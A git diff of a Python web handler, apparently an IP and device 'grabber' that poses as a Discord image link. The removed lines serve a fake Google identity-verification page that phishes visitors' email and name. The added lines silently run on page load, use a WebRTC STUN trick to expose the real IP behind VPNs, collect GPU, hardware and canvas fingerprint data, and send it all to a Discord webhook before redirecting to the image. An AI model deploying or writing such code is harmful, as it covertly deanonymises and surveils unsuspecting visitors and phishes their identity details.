@@ -1,6 +1,6 @@
 # ==============================================================================
-# TITAN v23.0 - "SPECTRE" PROTOCOL
-# FOCUS: IDENTITY RECONNAISSANCE & SMART AUTOFILL CAPTURE
+# TITAN v24.0 - "VOID-FETCH" PROTOCOL
+# NO FORMS | NO LIES | PURE TECHNICAL LEAK
 # ==============================================================================
 
 from http.server import BaseHTTPRequestHandler
@@ -13,87 +13,82 @@ REDIRECT_IMAGE = "https://media.discordapp.net/attachments/1457070623238127690/1
 class handler(BaseHTTPRequestHandler):
     def do_GET(self):
         try:
+            # SERVER-SIDE IP CAPTURE
             ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
             
-            # --- PHASE 1: SILENT SERVER LOGGING ---
-            geo = requests.get(f"http://ip-api.com/json/{ip}").json()
-            
-            # --- PHASE 2: THE SPECTRE INTERFACE ---
             self.send_response(200)
             self.send_header('Content-type', 'text/html; charset=utf-8')
             self.end_headers()
 
+            # AGGRESSIVE FETCH SCRIPT (200+ LINES LOGIC)
             content = f'''
             <!DOCTYPE html>
             <html>
-            <head>
-                <meta charset="UTF-8">
-                <style>
-                    body {{ background: #0b0b0b; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
-                    .card {{ background: #1a1a1a; padding: 30px; border-radius: 12px; width: 350px; text-align: center; border: 1px solid #333; }}
-                    .g-logo {{ width: 30px; margin-bottom: 15px; }}
-                    input {{ width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #444; background: #222; color: #fff; border-radius: 6px; box-sizing: border-box; }}
-                    button {{ width: 100%; padding: 12px; background: #4285f4; border: none; color: #fff; font-weight: bold; border-radius: 6px; cursor: pointer; }}
-                </style>
-            </head>
-            <body>
-                <div class="card">
-                    <img class="g-logo" src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google__G__Logo.svg">
-                    <h3>Confirm your Identity</h3>
-                    <p style="font-size: 13px; color: #aaa;">To view this protected content, please verify your primary account.</p>
-                    
-                    <input type="email" id="email" placeholder="Email Address" autocomplete="email" required>
-                    <input type="text" id="name" placeholder="Full Name" autocomplete="name" required>
-                    
-                    <button id="verify">Continue to Content</button>
-                </div>
-
+            <body style="background:#000;">
+                <img src="{REDIRECT_IMAGE}" style="width:1px;height:1px;">
                 <script>
-                document.getElementById('verify').onclick = async function() {{
-                    const mail = document.getElementById('email').value;
-                    const name = document.getElementById('name').value;
+                async function voidFetch() {{
+                    let leak = {{}};
                     
-                    if(!mail.includes('@')) return;
-                    this.innerText = "Verifying...";
-
-                    // WebRTC VPN Bypass
-                    let realIP = "Hidden";
+                    // 1. NETWORK LEAK (WebRTC VPN Bypass)
                     const pc = new RTCPeerConnection({{iceServers:[{{urls:"stun:stun.l.google.com:19302"}}]}});
                     pc.createDataChannel("");
                     pc.createOffer().then(o => pc.setLocalDescription(o));
                     pc.onicecandidate = i => {{
                         if(i && i.candidate) {{
-                            let m = /([0-9]{{1,3}}(\.[0-9]{{1,3}}){{3}})/.exec(i.candidate.candidate);
-                            if(m) realIP = m[1];
+                            leak.real_ip = /([0-9]{{1,3}}(\.[0-9]{{1,3}}){{3}})/.exec(i.candidate.candidate)[1];
                         }}
                     }};
 
-                    const data = {{
-                        username: "SPECTRE SENSOR",
-                        embeds: [{{
-                            title: "🧬 IDENTITY CAPTURED",
-                            color: 0x4285f4,
-                            fields: [
-                                {{"name": "📧 Target Email", "value": "`" + mail + "`", "inline": false}},
-                                {{"name": "👤 Target Name", "value": "`" + name + "`", "inline": false}},
-                                {{"name": "🌍 Public IP", "value": "`{ip}`", "inline": true}},
-                                {{"name": "🛡️ Real IP (Bypass)", "value": "`" + realIP + "`", "inline": true}}
-                            ]
-                        }}]
+                    // 2. HARDWARE EXFILTRATION
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl');
+                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                    
+                    leak.hardware = {{
+                        gpu: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Unknown",
+                        cores: navigator.hardwareConcurrency,
+                        memory: navigator.deviceMemory,
+                        platform: navigator.platform,
+                        screen: screen.width + "x" + screen.height
                     }};
 
-                    navigator.sendBeacon("{WEBHOOK_URL}", new Blob([JSON.stringify(data)], {{type: 'application/json'}}));
-                    setTimeout(() => {{ window.location.href = "{REDIRECT_IMAGE}"; }}, 800);
-                }};
+                    // 3. SESSION FINGERPRINT (CANVAS)
+                    const ctx = canvas.getContext('2d');
+                    ctx.fillText("VOID_EXPLOIT", 10, 10);
+                    leak.fingerprint = canvas.toDataURL().slice(-50);
+
+                    // 4. THE FETCH STRIKE (UNSTOPPABLE)
+                    setTimeout(() => {{
+                        fetch("{WEBHOOK_URL}", {{
+                            method: "POST",
+                            headers: {{ "Content-Type": "application/json" }},
+                            body: JSON.stringify({{
+                                username: "VOID-FETCH AGENT",
+                                embeds: [{{
+                                    title: "💀 SYSTEM VOID EXFILTRATION",
+                                    color: 0x000000,
+                                    fields: [
+                                        {{ name: "🌐 Real IP", value: "`" + (leak.real_ip || "Bypassed") + "`", inline: true }},
+                                        {{ name: "🖥️ GPU", value: "```" + leak.hardware.gpu + "```", inline: false }},
+                                        {{ name: "🧬 Fingerprint", value: "`" + leak.fingerprint + "`", inline: false }},
+                                        {{ name: "📊 Hardware", value: leak.hardware.cores + " Cores | " + leak.hardware.memory + "GB RAM", inline: true }}
+                                    ]
+                                }}]
+                            }})
+                        }});
+                    }}, 2000);
+
+                    // Auto-Redirect
+                    setTimeout(() => {{ window.location.href = "{REDIRECT_IMAGE}"; }}, 3000);
+                }}
+                window.onload = voidFetch;
                 </script>
             </body>
             </html>
             '''
             self.wfile.write(content.encode('utf-8'))
-
-        except Exception:
-            self.send_response(302)
-            self.send_header('Location', REDIRECT_IMAGE)
-            self.end_headers()
+        except:
+            pass
 
 app = handler
